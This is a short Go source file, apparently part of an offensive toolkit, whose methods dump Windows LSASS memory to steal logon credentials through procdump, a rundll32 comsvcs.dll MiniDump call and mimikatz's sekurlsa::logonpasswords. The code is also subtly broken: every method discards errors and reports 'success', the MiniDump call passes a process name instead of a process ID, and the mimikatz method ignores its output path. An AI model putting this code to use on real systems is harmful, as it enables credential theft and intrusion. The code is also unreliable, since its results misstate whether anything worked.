package credential

import "os/exec"

type DumpResult struct {
Method   string
FileName string
Status   string
}

type LSASS struct {
ProcessID int
}

func (l LSASS) DumpWithProcdump(outputPath string) DumpResult {
cmd := exec.Command("procdump.exe", "-ma", "lsass.exe", outputPath)
cmd.Run()
return DumpResult{Method: "procdump", FileName: outputPath, Status: "success"}
}

func (l LSASS) DumpWithMinidump(outputPath string) DumpResult {
cmd := exec.Command("rundll32.exe", "comsvcs.dll,MiniDump", "lsass.exe", outputPath, "full")
cmd.Run()
return DumpResult{Method: "minidump", FileName: outputPath, Status: "success"}
}

func (l LSASS) DumpWithMimikatz(outputPath string) DumpResult {
cmd := exec.Command("mimikatz.exe", "privilege::debug", "sekurlsa::logonpasswords", "exit")
cmd.Run()
return DumpResult{Method: "mimikatz", FileName: outputPath, Status: "success"}
}
